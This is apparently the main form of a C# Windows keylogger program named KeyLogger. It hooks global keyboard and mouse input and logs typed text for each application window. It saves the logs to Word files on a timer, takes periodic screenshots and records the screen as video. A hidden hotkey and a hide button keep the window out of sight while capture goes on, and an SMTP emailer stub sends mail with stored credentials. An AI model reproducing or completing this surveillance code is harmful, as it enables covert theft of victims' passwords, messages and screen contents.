using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Novacode;
using System.Drawing;
using AForge.Video;
using AForge.Video.FFMPEG;

namespace KeyLogger
{
    public partial class FrmMain : Form
    {
        private UserActivityHook hook;
        private Stack appNames;
        private Hashtable appLog;
        bool IsHidden;
        bool CtrlPressed;
        bool ShiftPressed;
        bool AltPressed;
        bool FsPressed;
        bool fileOn;
        bool emailOn;
        bool screenshotOn;
        bool recordOn;
        private readonly Frmoptions options; //readonly copy of options form
        private string logFileName;
        private Bitmap screenshot;
        private Graphics gr;
        private string screenshotLocation;
        private string recordLocation;
        private VideoFileWriter fileWriter;
        private ScreenCaptureStream captureStream;

        public FrmMain()
        {
            InitializeComponent();
            appNames = new Stack();
            appLog = new Hashtable();
            options = new Frmoptions();
            hook = new UserActivityHook();
            hook.Stop();
            hook.KeyDown += Hook_KeyDown;
            hook.KeyUp += Hook_KeyUp;
            hook.KeyPress += Hook_KeyPress;
            hook.OnMouseActivity += Hook_OnMouseActivity;
            screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            gr = Graphics.FromImage(screenshot);
        }

        private void Hook_OnMouseActivity(object sender, MouseEventArgs e)
        {
            labelMousePosition.Text = e.Location.ToString();
            if (e.Clicks > 0 && (e.Button == MouseButtons.Left || e.Button == MouseButtons.Right))
            {
                txt_MouseLog.AppendText(string.Format("Button:{0}, Location:{1}, Time:{2}{3}", e.Button, e.Location, DateTime.Now, Environment.NewLine));
            }
        }

        private void Hook_KeyPress(object sender, KeyPressEventArgs e)
        {
            if ((int)e.KeyChar == 8) SaveToLog(@"#BACKSPACE#");
            else if (e.KeyChar == 27) SaveToLog(@"#ESCAPE#");
            else SaveToLog(e.KeyChar.ToString());
        }

        private void SaveToLog(string txt)
        {
            txt_Log.AppendText(txt);
            txt_Log.SelectionStart = txt_Log.TextLength;//bring cursor to text end
            //get current app title
            string CurrentAppTitle = APIs.GetCurrentAppTitle();
            //get current app procces by its id number
            int procid = APIs.GetCurrentProcessID(APIs.GetCurrentWindowPointer());
            Process proc = Process.GetProcessById(procid);
            //get procces name
            string procName = proc.ProcessName;
            string currentApp = CurrentAppTitle + " #### " + procName;
            txt_CurrentWindowstitle.Text = currentApp;

            //check if currentApp does not exist in stack
            if (!appNames.Contains(currentApp))
            {
                //add currentApp to stack
                appNames.Push(currentApp);
                //create entry appLog
                appLog.Add(currentApp, "");
            }
            //find existing app in HashTable
            var items = appLog.GetEnumerator();
            while (items.MoveNext())
            {
                if (items.Key.ToString() == currentApp)
                {
                    //copy old data
                    string old = items.Value.ToString();
                    //remove item from HashTable
                    appLog.Remove(items.Key);
                    appLog.Add(currentApp, old + txt);
                    break;
                }
            }
        }

        private void SaveLogToFile()
        {
            DocX doc;
            if (!File.Exists(logFileName))
            {
                doc = DocX.Create(logFileName, DocumentTypes.Document);
            }
            else
            {
                doc = DocX.Load(logFileName);
                doc.InsertParagraph();
                doc.InsertParagraph();
            }

            Table tab = doc.AddTable(appNames.Count, 3);
            var items = appLog.GetEnumerator();
            int rowCount = 0;
            while (items.MoveNext())
            {
                tab.Rows[rowCount].Cells[0].Paragraphs[0].Append(items.Key.ToString().Remove(items.Key.ToString().IndexOf(" #### ")));
                tab.Rows[rowCount].Cells[1].Paragraphs[0].Append(items.Key.ToString().Substring(items.Key.ToString().IndexOf(" #### ") + 6));
                tab.Rows[rowCount].Cells[2].Paragraphs[0].Append(items.Value.ToString());
                rowCount++;
            }
            tab.AutoFit = AutoFit.Window;
            doc.InsertTable(tab);
            doc.Save();
        }

        private void Hook_KeyUp(object sender, KeyEventArgs e)
        {
            switch (e.KeyData)
            {
                case Keys.LControlKey:
                    CtrlPressed = false;
                    break;
                case Keys.LShiftKey:
                    ShiftPressed = false;
                    break;
                case Keys.LMenu:
                    AltPressed = false;
                    break;
                case Keys.F10:
                case Keys.F11:
                case Keys.F12:
                    FsPressed = false;
                    break;
            }
        }

        private void Hook_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyData)
            {
                case Keys.LControlKey:
                    CtrlPressed = true;
                    break;
                case Keys.LShiftKey:
                    ShiftPressed = true;
                    break;
                case Keys.LMenu:
                    AltPressed = true;
                    break;
                case Keys.F10:
                case Keys.F11:
                case Keys.F12:
                    FsPressed = true;
                    break;
            }
            if (CtrlPressed && AltPressed && ShiftPressed && FsPressed)
            {
                IsHidden = !IsHidden;
                this.Visible = !IsHidden;
            }

        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (!hook.IsActive) hook.Start();
            if (fileOn) timer_logsaver.Enabled = true;
            if (emailOn) timer_emailer.Enabled = true;
            if (screenshotOn) timer_screenshot.Enabled = true;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (fileOn) timer_logsaver.Enabled = false;
            if (emailOn) timer_emailer.Enabled = false;
            if (screenshotOn) timer_screenshot.Enabled = false;
            if (hook.IsActive) hook.Stop();
        }

        private void btn_hide_Click(object sender, EventArgs e)
        {
            if (!hook.IsActive) hook.Start();
            IsHidden = true;
            this.Visible = !IsHidden;
        }

        private void mnuItem_Save_Click(object sender, EventArgs e)
        {
            SaveLogToFile();
        }

        private void mnuItem_Settings_Click(object sender, EventArgs e)
        {
            if (hook.IsActive)
            {
                btnStop.PerformClick();
            }
            if (options.ShowDialog() == DialogResult.OK)
            {
                //check if file is supposed to be saved
                if (options.chk_autosaver.Checked)
                {
                    timer_logsaver.Interval = (int)options.numeric_savetimer.Value * 60000;
                    logFileName = options.txt_filelocation.Text;
                    timer_logsaver.Enabled = true;
                    fileOn = true;
                }
                else
                {
                    timer_logsaver.Enabled = false;
                    fileOn = false;
                }
                //check if an email is supposed to be sent
                if (options.chk_autoemailer.Checked)
                {
                    timer_emailer.Interval = (int)options.numeric_emailtime.Value * 60000;
                    timer_emailer.Enabled = true;
                    emailOn = true;
                }
                else
                {
                    timer_emailer.Enabled = false;
                    emailOn = false;
                }
                //check if a screenshot is supposed to be taken
                if (options.chk_Screenshot.Checked)
                {
                    screenshotLocation = options.txt_ScreenshotLocation.Text;
                    timer_screenshot.Interval = (int)options.num_Screenshot.Value * 60000;
                    timer_screenshot.Enabled = true;
                    screenshotOn = true;
                }
                else
                {
                    timer_screenshot.Enabled = false;
                    screenshotOn = false;
                }
                if (options.chk_record.Checked)
                {
                    recordLocation = options.txt_recordLocation.Text;
                    StartRecording();
                }
                else
                {
                    StopRecording();
                }
                btnStart.PerformClick();
            }
        }
        private void StartRecording()
        {
            fileWriter = new VideoFileWriter();
            fileWriter.Open(recordLocation + "\\" + DateTime.Now.ToString("yyyy-MM-dd hh-mm-ss") + ".avi", Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, (int)options.num_FPS.Value, (VideoCodec)options.cmb_Codec.SelectedValue, (int)options.cmb_Bitrate.SelectedValue);
            captureStream = new ScreenCaptureStream(Screen.PrimaryScreen.Bounds);
            captureStream.NewFrame += CaptureStream_NewFrame;
            captureStream.Start();
        }

        private void CaptureStream_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (recordOn)
            {
                fileWriter.WriteVideoFrame(eventArgs.Frame);
            }
            else
            {
                captureStream.SignalToStop();
            }
        }

        private void StopRecording()
        {

        }

        private void timer_logsaver_Tick(object sender, EventArgs e)
        {
            SaveLogToFile();
        }

        private void timer_emailer_Tick(object sender, EventArgs e)
        {
            //create smtp client object
            SmtpClient client = new SmtpClient()
            {
                Host = options.txt_smtpServer.Text,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(options.txt_emailAddress.Text, options.txt_emailpassword.Text),
                Port = int.Parse(options.txt_smtpport.Text),
                EnableSsl = options.chk_usessl.Checked,
                DeliveryMethod = SmtpDeliveryMethod.Network
            };

            //create message to send
            MailMessage msg = new MailMessage(options.txt_emailAddress.Text, options.txt_emailAddress.Text);
            msg.Subject = "JustAnotherSpammerLogger";
            msg.Body = "Wait is this just a test!?";
            try
            {
                client.Send(msg);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.StackTrace);
            }

        }

        private void mnuItem_About_Click(object sender, EventArgs e)
        {

        }

        private void timer_screenshot_Tick(object sender, EventArgs e)
        {
            gr.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshot.Size, CopyPixelOperation.SourceCopy);
            screenshot.Save(screenshotLocation + "\\" + DateTime.Now.ToString("yyyy-MM-dd hh-mm-ss") + ".jpg");
        }
    }
}